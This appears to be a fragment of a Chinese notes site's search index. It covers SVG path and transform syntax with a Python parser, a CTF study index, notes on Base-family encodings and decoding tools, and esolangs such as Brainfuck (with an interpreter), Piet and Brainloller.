\u4ece\u5f53\u524d\u70b9\u5230 (x, y) \u5229\u7528\u4e8c\u9636\u8d1d\u585e\u5c14\u753b\u4e00\u6761\u66f2\u7ebf \u5176\u4e2d\u63a7\u5236\u70b9\u662f\u4e0a\u4e00\u6761\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\u63a7\u5236\u70b9\u5173\u4e8e\u5f53\u524d\u70b9\u7684\u4e2d\u5fc3\u5bf9\u79f0\u70b9 \u5982\u679c\u6ca1\u6709\u4e0a\u4e00\u6761\u8def\u5f84\u6216\u8005\u4e0a\u4e00\u6761\u8def\u5f84\u4e0d\u662f\u4e8c\u9636\u8d1d\u585e\u5c14\u66f2\u7ebf\uff08QqTt\uff09\uff0c\u5219\u63a7\u5236\u70b9\u5c31\u662f\u5f53\u524d\u70b9 A or a elliptical arc \u6700\u540e\u4e00\u4e2a\u692d\u5706\u5f27\u7684\u53c2\u6570\u548c\u7528\u6cd5\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u6765\u8bf4\uff1a \u53c2\u6570\uff1a(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+ \u7528\u6cd5\uff1a rx, ry\uff1a\u692d\u5706\u5f27\u7684\u6c34\u5e73\u548c\u5782\u76f4\u534a\u5f84 x-axis-rotation\uff1a\u4e00\u4e2a\u89d2\u5ea6\uff0c\u4ee5 deg \u4e3a\u5355\u4f4d\uff0c\u8868\u793a x \u8f74\u65cb\u8f6c\u89d2\u5ea6 large-arc-flag: 0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u52a3\u5f27\uff0c1 \u8868\u793a\u8fd9\u6bb5\u692d\u5706\u5f27\u5e94\u8be5\u662f\u4f18\u5f27 sweep-flag\uff1a0 \u6216 1\uff0c\u662f 0 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u6cbf\u9006\u65f6\u9488\u753b\u5f27\uff0c1 \u8868\u793a\u4ece\u8d77\u70b9\u5230\u7ec8\u70b9\u987a\u65f6\u9488\u753b\u5f27 x, y\uff1a\u7ec8\u70b9\u5750\u6807 A \u547d\u4ee4\u4f8b\u5b50","title":"&lt;path> \u8def\u5f84"},{"location":"cs/web/svg/#ebnf_1","text":"d \u5c5e\u6027\u91cc\u7684\u662f svg-path \u7c7b\u578b\uff0c\u5b9a\u4e49\u662f\uff1a svg-path : wsp * moveto-drawto-command-groups ? wsp * moveto-drawto-command-groups : moveto-drawto-command-group | moveto-drawto-command-group wsp * moveto-drawto-command-groups moveto-drawto-command-group : moveto wsp * drawto-commands ? drawto-commands : drawto-command | drawto-command wsp * drawto-commands drawto-command : closepath | lineto | horizontal-lineto | vertical-lineto | curveto | smooth-curveto | quadratic-bezier-curveto | smooth-quadratic-bezier-curveto | elliptical-arc drawto-command: \u9664\u4e86 M/m \u4ee5\u5916\u7684 9 \u79cd\u547d\u4ee4\u5b57\u7b26\u4e32 drawto-commands: \u7528\u4efb\u610f\u591a\uff08\u53ef\u4e3a0\uff09 wsp \u5206\u9694\u7684 drawto-command moveto-drawto-command-group: moveto \u547d\u4ee4\u5f00\u5934\u7684\u547d\u4ee4\u7ec4\uff08\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u5b50\u8def\u5f84\uff09\uff0c\u53ef\u4ee5\u4ec5\u6709 moveto\uff0c\u4e5f\u53ef\u4ee5\u662f\u7531\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684\u4e00\u4e9b\u547d\u4ee4 moveto-drawto-command-groups: \u5b50\u8def\u5f84\u96c6\u5408\uff0c\u7528\u4efb\u610f\u591a\uff08\u53ef\u7701\u7565\uff09wsp \u5206\u9694\u7684 moveto-drawto-command-group svg-path: \u53ef\u4ee5\u4e3a \u7a7a / \u5f00\u5934\u7ed3\u5c3e\u6709\u4efb\u610f\u591a wsp \u7684 moveto-drawto-command-groups \u4e0b\u9762\u662f\u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5\uff0c\u90fd\u6bd4\u8f83\u6e05\u6670\uff0c\u5c31\u4e0d\u591a\u89e3\u91ca\u4e86\uff1a \u5404\u4e2a\u547d\u4ee4\u7684\u8bed\u6cd5 moveto : ( \" M \" | \" m \" ) wsp * moveto-argument-sequence moveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence closepath : (\" Z \" | \" z \") lineto : ( \" L \" | \" l \" ) wsp * lineto-argument-sequence lineto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? lineto-argument-sequence horizontal-lineto : ( \" H \" | \" h \" ) wsp * horizontal-lineto-argument-sequence horizontal-lineto-argument-sequence : coordinate | coordinate comma-wsp ? horizontal-lineto-argument-sequence vertical-lineto : ( \" V \" | \" v \" ) wsp * vertical-lineto-argument-sequence vertical-lineto-argument-sequence : coordinate | coordinate comma-wsp ? vertical-lineto-argument-sequence curveto : ( \" C \" | \" c \" ) wsp * curveto-argument-sequence curveto-argument-sequence : curveto-argument | curveto-argument comma-wsp ? curveto-argument-sequence curveto-argument : coordinate-pair comma-wsp ? coordinate-pair comma-wsp ? coordinate-pair smooth-curveto : ( \" S \" | \" s \" ) wsp * smooth-curveto-argument-sequence smooth-curveto-argument-sequence : smooth-curveto-argument | smooth-curveto-argument comma-wsp ? smooth-curveto-argument-sequence smooth-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair quadratic-bezier-curveto : ( \" Q \" | \" q \" ) wsp * quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument-sequence : quadratic-bezier-curveto-argument | quadratic-bezier-curveto-argument comma-wsp ? quadratic-bezier-curveto-argument-sequence quadratic-bezier-curveto-argument : coordinate-pair comma-wsp ? coordinate-pair smooth-quadratic-bezier-curveto : ( \" T \" | \" t \" ) wsp * smooth-quadratic-bezier-curveto-argument-sequence smooth-quadratic-bezier-curveto-argument-sequence : coordinate-pair | coordinate-pair comma-wsp ? smooth-quadratic-bezier-curveto-argument-sequence elliptical-arc : ( \" A \" | \" a \" ) wsp * elliptical-arc-argument-sequence elliptical-arc-argument-sequence : elliptical-arc-argument | elliptical-arc-argument comma-wsp ? elliptical-arc-argument-sequence elliptical-arc-argument : nonnegative-number comma-wsp ? nonnegative-number comma-wsp ? number comma-wsp flag comma-wsp ? flag comma-wsp ? coordinate-pair flag : \"0\" | \"1\"","title":"EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#path-string-parser","text":"python \u5199\u7684 path string \u89e3\u6790 class InvalidPathError ( ValueError ): pass class _PathStringParser : # modified from https://github.com/regebro/svg.path/ def __init__ ( self , arguments , rules ): self . args = [] arguments = bytearray ( arguments , \"ascii\" ) self . _strip_array ( arguments ) while arguments : for rule in rules : self . _rule_to_function_map [ rule ]( arguments ) @property def _rule_to_function_map ( self ): return { \"x\" : self . _get_number , \"y\" : self . _get_number , \"a\" : self . _get_number , \"u\" : self . _get_unsigned_number , \"f\" : self . _get_flag , } def _strip_array ( self , arg_array ): # wsp: (0x9, 0x20, 0xA, 0xC, 0xD) with comma 0x2C # https://www.w3.org/TR/SVG/paths.html#PathDataBNF while arg_array and arg_array [ 0 ] in [ 0x9 , 0x20 , 0xA , 0xC , 0xD , 0x2C ]: arg_array [ 0 : 1 ] = b \"\" def _get_number ( self , arg_array ): pattern = re . compile ( rb \"^[-+]?(?:\\d+(?:\\.\\d*)?|\\.\\d+)(?:[eE][-+]?\\d+)?\" ) res = pattern . search ( arg_array ) if not res : raise InvalidPathError ( f \"Expected a number, got ' { arg_array } '\" ) number = float ( res . group ()) self . args . append ( number ) arg_array [ res . start (): res . end ()] = b \"\" self . _strip_array ( arg_array ) return number def _get_unsigned_number ( self , arg_array ): number = self . _get_number ( arg_array ) if number < 0 : raise InvalidPathError ( f \"Expected an unsigned number, got ' { number } '\" ) return number def _get_flag ( self , arg_array ): flag = arg_array [ 0 ] if flag != 48 and flag != 49 : raise InvalidPathError ( f \"Expected a flag (0/1), got ' { chr ( flag ) } '\" ) flag -= 48 self . args . append ( flag ) arg_array [ 0 : 1 ] = b \"\" self . _strip_array ( arg_array ) return flag","title":"path string parser"},{"location":"cs/web/svg/#transform","text":"transform \u662f\u5bf9\u5f53\u524d\u5143\u7d20\u53ca\u5176\u5b50\u5143\u7d20\u7684\u6574\u4e2a\u5750\u6807\u7cfb\u8fdb\u884c\u7684\u53d8\u6362\uff0c\u4ece\u5de6\u5411\u53f3\u7ed3\u5408 \u6240\u4ee5\u4e5f\u5c31\u53ef\u4ee5\u770b\u505a\u5bf9\u5143\u7d20\u5e94\u7528 transform\uff0c\u4f46\u662f\u4ece\u53f3\u5411\u5de6\u7ed3\u5408 \u6240\u6709\u7684 transform \u90fd\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a 3 \u9636\u77e9\u9635\uff1a \\[\\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\] \u4f5c\u7528\u65b9\u5f0f\u662f\uff1a \\[ \\begin{bmatrix} x_\\text{prevCoordSys} \\\\ y_\\text{prevCoordSys} \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} a & c & e \\\\ b & d & f \\\\ 0 & 0 & 1 \\end{bmatrix}\\cdot \\begin{bmatrix} x_\\text{newCoordSys} \\\\ y_\\text{newCoordSys} \\\\ 1 \\end{bmatrix} \\] \u5176\u4e2d \\((x_\\text{prevCoordSys}, y_\\text{prevCoordSys})\\) \u8868\u793a\u5728 transform \u524d\u7684\u5750\u6807\u7cfb\u7edf\u4e0b\u7684\u5750\u6807\uff0c\u8fd9\u4e2a 3 \u9636 transform \u7684\u77e9\u9635\u8bb0\u4e3a [a b c d e f] SVG \u4e00\u5171\u652f\u6301\u516d\u79cd transform\uff0c\u4e0b\u9762\u5177\u4f53\u6765\u8bf4\uff1a matrix(a b c d e f): \u65bd\u52a0\u77e9\u9635 [a b c d e f] \u4f5c\u7528 translate(tx [ty]): \u5e73\u79fb\uff0cx \u8f74\u79fb tx\uff0cy \u8f74\u79fb ty\uff0c\u5982\u679c\u6ca1\u6709 ty \u5c31\u662f 0\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 0 1 tx ty] scale(sx [sy]): \u7f29\u653e\uff0cx \u8f74\u7f29\u653e sx \u500d\uff0cy \u8f74\u7f29\u653e sy \u500d\uff0c\u5982\u679c\u6ca1\u6709 sy\uff0c\u5219 sy \u548c sx \u76f8\u7b49\u3002\u76f8\u5f53\u4e8e\u77e9\u9635 [sx 0 0 sy 0 0] rotate(angle [cx cy]): \u987a\u65f6\u9488\u65cb\u8f6c angle \u5ea6\uff0c\u4ee5 cx cy \u4e3a\u4e2d\u5fc3\uff0c\u6ca1\u6709\u6307\u5b9a\u5c31\u662f\u539f\u70b9 rotate(angle cx cy) \u76f8\u5f53\u4e8e translate(cx cy) rotate(angle) translate(-cx -cy) rotate(a) \u76f8\u5f53\u4e8e\u77e9\u9635 [cos(a) sin(a) -sin(a) cos(a) 0 0] skewX(angle): x \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 0 tan(a) 1 0 0] skewY(angle): y \u8f74\u503e\u659c angle \u5ea6\uff0c\u76f8\u5f53\u4e8e\u77e9\u9635 [1 tan(a) 0 1 0 0]","title":"transform \u7684\u5904\u7406"},{"location":"cs/web/svg/#ebnf_2","text":"transform \u7684 EBNF \u8bed\u6cd5 transform-list : wsp * transforms ? wsp * transforms : transform | transform comma-wsp + transforms transform : matrix | translate | scale | rotate | skewX | skewY matrix : \" matrix \" wsp * \"(\" wsp * number comma-wsp number comma-wsp number comma-wsp number comma-wsp number comma-wsp number wsp * \")\" translate : \" translate \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" scale : \" scale \" wsp * \"(\" wsp * number ( comma-wsp number )? wsp * \")\" rotate : \" rotate \" wsp * \"(\" wsp * number ( comma-wsp number comma-wsp number )? wsp * \")\" skewX : \" skewX \" wsp * \"(\" wsp * number wsp * \")\" skewY : \" skewY \" wsp * \"(\" wsp * number wsp * \")\" \u6b63\u5219\u5339\u914d\u5206\u79bb transform: transform_pattern = re . compile ( \"|\" . join ([ x + r \"[^)]*\\)\" for x in transform_names ])) \u91cc\u9762\u7684 number \u90fd\u53ef\u4ee5\u7528\u5f00\u5934\u8bf4\u5230\u7684\u6b63\u5219\u6765\u5339\u914d","title":"EBNF \u8bed\u6cd5"},{"location":"cs/web/svg/#_5","text":"\u9ed8\u8ba4\u6837\u5f0f\uff1a DEFAULT_STYLE = { \"fill\" : \"black\" , \"stroke\" : \"none\" , \"fill-opacity\" : \"1\" , \"stroke-opacity\" : \"1\" , \"stroke-width\" : 0 , } \u5269\u4e0b\u7684\u5c31\u662f\u6309\u7167 css \u7684\u89c4\u5219\u5c42\u53e0\u5c31\u597d\u4e86","title":"\u6837\u5f0f"},{"location":"ctf/","text":"CTF \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5728\u6253 CTF \u8fc7\u7a0b\u4e2d\u5b66\u4e60\u7684\u7b14\u8bb0 \u76ee\u524d\u53ea\u653b misc\uff0c\u6240\u4ee5\u8fd9\u91cc\u90fd\u662f misc \u7c7b\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u6781\u4e0d\u5168\uff08\u9003 \u6162\u6162\u6536\u96c6\u5b66\u4e60\u4e86 _(:\u0437\u300d\u2220)_ Table of Contents \u00b6 Steganography \u9690\u5199\u672f \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199 Sandbox Escape \u6c99\u7bb1\u9003\u9038 Python \u6c99\u7bb1\u9003\u9038 Coding & Cipher \u7f16\u7801\u548c\u5bc6\u7801 QRCode \u4e8c\u7ef4\u7801\u89c4\u8303 Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00","title":"CTF"},{"location":"ctf/#ctf","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5728\u6253 CTF \u8fc7\u7a0b\u4e2d\u5b66\u4e60\u7684\u7b14\u8bb0 \u76ee\u524d\u53ea\u653b misc\uff0c\u6240\u4ee5\u8fd9\u91cc\u90fd\u662f misc \u7c7b\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u8fd8\u6781\u4e0d\u5168\uff08\u9003 \u6162\u6162\u6536\u96c6\u5b66\u4e60\u4e86 _(:\u0437\u300d\u2220)_","title":"CTF"},{"location":"ctf/#table-of-contents","text":"Steganography \u9690\u5199\u672f \u56fe\u7247\u9690\u5199 \u97f3\u9891\u9690\u5199 Sandbox Escape \u6c99\u7bb1\u9003\u9038 Python \u6c99\u7bb1\u9003\u9038 Coding & Cipher \u7f16\u7801\u548c\u5bc6\u7801 QRCode \u4e8c\u7ef4\u7801\u89c4\u8303 Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00","title":"Table of Contents"},{"location":"ctf/coding/","text":"\u7f16\u7801\u53ca\u53e4\u5178\u5bc6\u7801 \u00b6 Abstract \u9898\u76ee\u4e2d\u4e5f\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u7f16\u7801\u548c\u53e4\u5178\u5bc6\u7801\u6709\u5173\u7684\u8fc7\u7a0b \u7f16\u7801\u9700\u8981\u6839\u636e\u7279\u5f81\u5224\u65ad\u51fa\u7f16\u7801\u65b9\u5f0f\uff0c\u53e4\u5178\u5bc6\u7801\u5219\u9700\u8981\u77e5\u9053\u5bc6\u94a5\u6765\u89e3\u5bc6 \u7f16\u7801 \u00b6 Base64 \u00b6 Base64 \u662f\u5c063\u4e2a8\u4f4d\u8f6c\u4e3a4\u4e2a6\u4f4d\u4e8c\u8fdb\u5236\u6570\u7684\u7f16\u7801\u65b9\u6cd5\u3002\u5982\u679c\u7f16\u7801\u540e\u4e0d\u4e3a4\u7684\u500d\u6570\u5219\u8865 = \uff0c\u6240\u4ee5\u7279\u5f81\u662f\u7ed3\u5c3e\u4f1a\u6709 0-2 \u4e2a = \u5e76\u4e146\u4f4d\u4e8c\u8fdb\u5236\u6570\u4f1a\u88ab\u6620\u5c04\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5206\u522b\u662f A-Za-z0-9+/ 63\u4e2a\u5b57\u7b26\uff0c\u7b97 = 64\u4e2a Base\u7cfb\u5217 \u00b6 \u7f16\u7801\u65b9\u5f0f \u7279\u5f81 \u5b57\u7b26\u96c6 Base100 \u7f16\u7801\u4e3a emoji Base85 \u7279\u6b8a\u5b57\u7b26\u591a 0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~ Base64 \u7ed3\u5c3e\u4f1a\u67090-2\u4e2a\u7b49\u53f7 A-Za-z0-9+/ Base58 \u6ca1\u6709\u7279\u6b8a\u5b57\u7b26\u3001\u6ca1\u6709 0OIl 1-9A-HJ-NP-Za-km-z Base36 0-9A-Z Base32 \u7ed3\u5c3e\u4f1a\u6709\u8f83\u591a\u7b49\u53f7 A-Z2-7 Base16 \u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u4e32 0-9A-F \u5de5\u5177\uff1a mufeedvh/basecrack xxencode & uuencode \u00b6 \u7c7b\u4f3c Base64 xxencode \u5b57\u7b26\u96c6\uff1a +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz uuencode \u5b57\u7b26\u96c6\uff1a !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ \u7a7a\u683c\u53ef\u80fd\u4f1a\u6539\u4e3a ` \u5de5\u5177\uff1apython codecs.encode / codecs.decode Unicode \u00b6 https://home.unicode.org/ https://tool.chinaz.com/Tools/Unicode.aspx Emojis \u00b6 https://www.emojiall.com/zh-hans emoji-aes \uff08\u9700\u8981 key\uff09\uff0c\u7279\u5f81\uff1a\ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\u7b49\u5f00\u5934 \u5de5\u5177 \u00b6 DenCode\uff1a https://dencode.com/ Ciphey\uff1a Ciphey/Ciphey CyberChef\uff1a https://gchq.github.io/CyberChef/ emoji-aes\uff1a https://aghorler.github.io/emoji-aes/ tool box\uff1a http://www.hiencode.com/ \u5176\u4ed6\u7f16\u7801 \u00b6 \u76f2\u6587\u6570\u5b66\uff1a https://nemeth.aphtech.org/ \u4e09\u8bcd\u5730\u5740\uff1a https://map.what3words.com/ \u53e4\u5178\u5bc6\u7801 \u00b6","title":"\u7f16\u7801\u4e0e\u5bc6\u7801"},{"location":"ctf/coding/#_1","text":"Abstract \u9898\u76ee\u4e2d\u4e5f\u7ecf\u5e38\u4f1a\u51fa\u73b0\u4e00\u4e9b\u548c\u7f16\u7801\u548c\u53e4\u5178\u5bc6\u7801\u6709\u5173\u7684\u8fc7\u7a0b \u7f16\u7801\u9700\u8981\u6839\u636e\u7279\u5f81\u5224\u65ad\u51fa\u7f16\u7801\u65b9\u5f0f\uff0c\u53e4\u5178\u5bc6\u7801\u5219\u9700\u8981\u77e5\u9053\u5bc6\u94a5\u6765\u89e3\u5bc6","title":"\u7f16\u7801\u53ca\u53e4\u5178\u5bc6\u7801"},{"location":"ctf/coding/#_2","text":"","title":"\u7f16\u7801"},{"location":"ctf/coding/#base64","text":"Base64 \u662f\u5c063\u4e2a8\u4f4d\u8f6c\u4e3a4\u4e2a6\u4f4d\u4e8c\u8fdb\u5236\u6570\u7684\u7f16\u7801\u65b9\u6cd5\u3002\u5982\u679c\u7f16\u7801\u540e\u4e0d\u4e3a4\u7684\u500d\u6570\u5219\u8865 = \uff0c\u6240\u4ee5\u7279\u5f81\u662f\u7ed3\u5c3e\u4f1a\u6709 0-2 \u4e2a = \u5e76\u4e146\u4f4d\u4e8c\u8fdb\u5236\u6570\u4f1a\u88ab\u6620\u5c04\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5206\u522b\u662f A-Za-z0-9+/ 63\u4e2a\u5b57\u7b26\uff0c\u7b97 = 64\u4e2a","title":"Base64"},{"location":"ctf/coding/#base","text":"\u7f16\u7801\u65b9\u5f0f \u7279\u5f81 \u5b57\u7b26\u96c6 Base100 \u7f16\u7801\u4e3a emoji Base85 \u7279\u6b8a\u5b57\u7b26\u591a 0-9A-Za-z!#$%&()*+-;<=>?@^_`{|}~ Base64 \u7ed3\u5c3e\u4f1a\u67090-2\u4e2a\u7b49\u53f7 A-Za-z0-9+/ Base58 \u6ca1\u6709\u7279\u6b8a\u5b57\u7b26\u3001\u6ca1\u6709 0OIl 1-9A-HJ-NP-Za-km-z Base36 0-9A-Z Base32 \u7ed3\u5c3e\u4f1a\u6709\u8f83\u591a\u7b49\u53f7 A-Z2-7 Base16 \u662f\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u4e32 0-9A-F \u5de5\u5177\uff1a mufeedvh/basecrack","title":"Base\u7cfb\u5217"},{"location":"ctf/coding/#xxencode-uuencode","text":"\u7c7b\u4f3c Base64 xxencode \u5b57\u7b26\u96c6\uff1a +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz uuencode \u5b57\u7b26\u96c6\uff1a !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ \u7a7a\u683c\u53ef\u80fd\u4f1a\u6539\u4e3a ` \u5de5\u5177\uff1apython codecs.encode / codecs.decode","title":"xxencode &amp; uuencode"},{"location":"ctf/coding/#unicode","text":"https://home.unicode.org/ https://tool.chinaz.com/Tools/Unicode.aspx","title":"Unicode"},{"location":"ctf/coding/#emojis","text":"https://www.emojiall.com/zh-hans emoji-aes \uff08\u9700\u8981 key\uff09\uff0c\u7279\u5f81\uff1a\ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\u7b49\u5f00\u5934","title":"Emojis"},{"location":"ctf/coding/#_3","text":"DenCode\uff1a https://dencode.com/ Ciphey\uff1a Ciphey/Ciphey CyberChef\uff1a https://gchq.github.io/CyberChef/ emoji-aes\uff1a https://aghorler.github.io/emoji-aes/ tool box\uff1a http://www.hiencode.com/","title":"\u5de5\u5177"},{"location":"ctf/coding/#_4","text":"\u76f2\u6587\u6570\u5b66\uff1a https://nemeth.aphtech.org/ \u4e09\u8bcd\u5730\u5740\uff1a https://map.what3words.com/","title":"\u5176\u4ed6\u7f16\u7801"},{"location":"ctf/coding/#_5","text":"","title":"\u53e4\u5178\u5bc6\u7801"},{"location":"ctf/esolang/","text":"Esolang \u6df1\u5965\u7f16\u7a0b\u8bed\u8a00 \u00b6 An esoteric programming language, or esolang, is a computer programming language designed to experiment with weird ideas, to be hard to program in, or as a joke, rather than for practical use. \u2014\u2014\u2014\u2014 esolang wiki Abstract \u6b64\u5904\u6574\u7406\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7a0b\u8bed\u8a00\u6216\u8005\u6b63\u5e38\u7f16\u7a0b\u8bed\u8a00\u7684\u7279\u6b8a\u4f7f\u7528\u65b9\u6cd5\uff0c\u591a\u89c1\u4e8eMisc\u9898\u4e2d\uff0c\u4f46\u662f\u6b64\u9875\u9762\u4e5f\u4ec5\u662f\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u89c1\u7684 Esolang\u548c\u5df2\u7ecf\u9047\u5230\u8fc7\u7684Esolang\uff0c\u9898\u76ee\u4e2d\u9047\u5230\u8fd8\u662f\u8981\u968f\u673a\u5e94\u53d8\uff0c\u5584\u7528\u641c\u7d22 Esolang, the esoteric programming languages wiki \u6781\u5c0f\u8bed\u8a00 \u00b6 \u6781\u5c0f\u8bed\u8a00\u6307\u7684\u662f\u6307\u4ee4\u6570\u5f88\u5c11\u7684\u4e00\u79cd Esolang BrainFuck \u00b6 \u7279\u5f81\uff1a\u5305\u542b ><+-.,[] \u516b\u4e2a\u6307\u4ee4\uff0c\u5177\u6709\u56fe\u7075\u5b8c\u5907\u6027 \u6307\u4ee4 \u542b\u4e49 > \u6307\u9488\u52a0\u4e00\uff08\u53f3\u79fb\u4e00\u4f4d\uff09 < \u6307\u9488\u51cf\u4e00\uff08\u5de6\u79fb\u4e00\u4f4d\uff09 + \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u52a0\u4e00 - \u6307\u9488\u6307\u5411\u7684\u5355\u5143\u7684\u503c\u51cf\u4e00 . \u8f93\u51fa\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u5185\u5bb9\uff08ASCII\u7801\uff09 , \u8f93\u5165\u5185\u5bb9\u5230\u6307\u9488\u6307\u5411\u7684\u5355\u5143\uff08ASCII\u7801\uff09 [ \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e3a\u96f6\uff0c\u5411\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 ] \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 ] \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5355\u5143\u503c\u4e0d\u4e3a\u96f6\uff0c\u5411\u524d\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684 [ \u6307\u4ee4\u7684\u6b21\u4e00\u6307\u4ee4\u5904 \u5176\u5b83 \u76f4\u63a5\u5ffd\u7565 e.g. ++++++++ [>++++++++++++>+++++++++++++<<-] >++++. -. >+++++++. <+. +. BrainFuck \u89e3\u91ca\u5668 import sys def Brainfuck ( code ): code = '' . join ( filter ( lambda x : x in [ '.' , ',' , '[' , ']' , '<' , '>' , '+' , '-' ], code )) bracemap = buildbracemap ( code ) cells , codeptr , cellptr = [ 0 ], 0 , 0 result = '' while codeptr < len ( code ): command = code [ codeptr ] if command == \">\" : cellptr += 1 if cellptr == len ( cells ): cells . append ( 0 ) elif command == \"<\" : cellptr = 0 if cellptr <= 0 else cellptr - 1 elif command == \"+\" : cells [ cellptr ] = cells [ cellptr ] + 1 if cells [ cellptr ] < 255 else 0 elif command == \"-\" : cells [ cellptr ] = cells [ cellptr ] - 1 if cells [ cellptr ] > 0 else 255 elif command == \"[\" and cells [ cellptr ] == 0 : codeptr = bracemap [ codeptr ] elif command == \"]\" and cells [ cellptr ] != 0 : codeptr = bracemap [ codeptr ] elif command == \".\" : result += chr ( cells [ cellptr ]) elif command == \",\" : cells [ cellptr ] = ord ( input ( \"[*] input one char > \" )) codeptr += 1 print ( f \"[+] Result: { result } \" ) def buildbracemap ( code ): temp_bracestack , bracemap = [], {} for position , command in enumerate ( code ): if command == \"[\" : temp_bracestack . append ( position ) if command == \"]\" : start = temp_bracestack . pop () bracemap [ start ] = position bracemap [ position ] = start return bracemap if __name__ == \"__main__\" : code = input ( \"[*] Input brainfuck code > \" ) Brainfuck ( code ) \u53ef\u89c6\u5316\u6267\u884c\uff1a http://fatiherikli.github.io/brainfuck-visualizer/ Brainfuck Language - Online Decoder, Translator, Interpreter (dcode.fr) Marcos Minond \u53e6\u6709\u4f17\u591a\u53d8\u79cd\uff0c\u5982 Ook!\uff0cBrainfuck+3\uff0c*brainfuck \u7b49 \u8981\u6bd4\u8f83\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u6709\u7684 brainfuck \u4ee3\u7801\u4f1a\u5411\u5de6\u8d8a\u754c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u628a\u89e3\u91ca\u5668\u7684\u521d\u59cb\u4f4d\u7f6e\u5f80\u540e\u79fb\u4e00\u4e0b\uff08\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u9884\u5148\u6269\u5145 cells \uff0c\u7136\u540e\u4ee4\u8d77\u59cb\u7684 cellptr \u5927\u4e8e0\uff09 Ook! \u00b6 \u7279\u5f81\uff1a\u5168\u662f Ook Ook! Programming Language - Esoteric Code Decoder, Encoder, Translator (dcode.fr) \u56fe\u5f62\u5316\u8bed\u8a00 \u00b6 \u56fe\u5f62\u5316\u8bed\u8a00\u662f\u7528\u4e00\u4e9b\u50cf\u7d20\u56fe\u6784\u5efa\u6781\u5c0f\u8bed\u8a00\u7684 Esolang\uff0c\u6700\u4e3a\u8457\u540d\u7684\u662f Piet Piet \u00b6 \u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670920\u79cd\u989c\u8272\uff1a #FFC0C0 #FFFFC0 #C0FFC0 #C0FFFF #C0C0FF #FFC0FF #FF0000 #FFFF00 #00FF00 #00FFFF #0000FF #FF00FF #C00000 #C0C000 #00C000 #00C0C0 #0000C0 #C000C0 #FFFFFF #000000 \u4ec5\u7531 00\u3001C0\u3001FF \u6784\u6210\uff0c\u4f8b\u5982\uff1a DM's Esoteric Programming Languages - Piet (dangermouse.net) DM's Esoteric Programming Languages - Piet Samples (dangermouse.net) \u53e6\u8fd8\u6709\u4e00\u4e9b\u4e9b\u53d8\u79cd\uff0c\u5982 Piet-Q Brainloller \u00b6 \u7279\u5f81\uff1a\u50cf\u7d20\u56fe\uff0c\u4e14\u53ea\u670910\u79cd\u989c\u8272\uff0c\u5176\u4e2d8\u79cd\u5bf9\u5e94 BF \u76848\u4e2a\u6307\u4ee4\uff0c2\u79cd\u5bf9\u5e94\u6307\u9488\u65cb\u8f6c\u6307\u4ee4\uff0c\u4e14\u4ec5\u7531 00\u300180\u3001FF \u6784\u6210 \u989c\u8272 hex \u503c rgb \u503c \u542b\u4e49 \u7ea2 #FF0000 (255, 0, 0) > \u6df1\u7ea2 #800000 (128, 0, 0) < \u7eff #00FF00 (0, 255, 0) + \u6df1\u7eff #008000 (0, 128, 0) - \u84dd #0000FF (0, 0, 255) . \u6df1\u84dd #000080 (0, 0, 128) , \u9ec4 